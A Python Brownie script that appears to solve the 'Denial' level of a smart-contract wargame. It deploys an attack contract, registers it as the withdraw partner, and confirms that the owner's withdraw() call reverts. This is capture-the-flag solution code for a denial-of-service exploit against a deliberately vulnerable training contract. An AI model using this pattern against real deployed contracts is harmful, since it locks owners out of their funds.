from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import Denial, DenialAttack

##########################################
# If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        denial = load_challenge(ContractObject=Denial, instance_key='denial')
    else:
        denial = deploy_locally(ContractObject=Denial, from_account=_from)
    
    # deploy attacker contract that cannot receive funds
    denialattack = DenialAttack.deploy(denial.address, _from)

    # set withdraw partner as the contract
    denialattack.setThisAsWithdrawPartner(_from)

    # test withdraw() to see if the tx fails
    try:
        tx = denial.withdraw(_from | {'allow_revert':True})
        # fail tx assertion
        fail_tx_assertion = False

    except:
        # fail tx assertion
        fail_tx_assertion = True

    print(f"The transaction failed/reverted: {fail_tx_assertion}")

    return fail_tx_assertion

def main():
    solve_challenge()
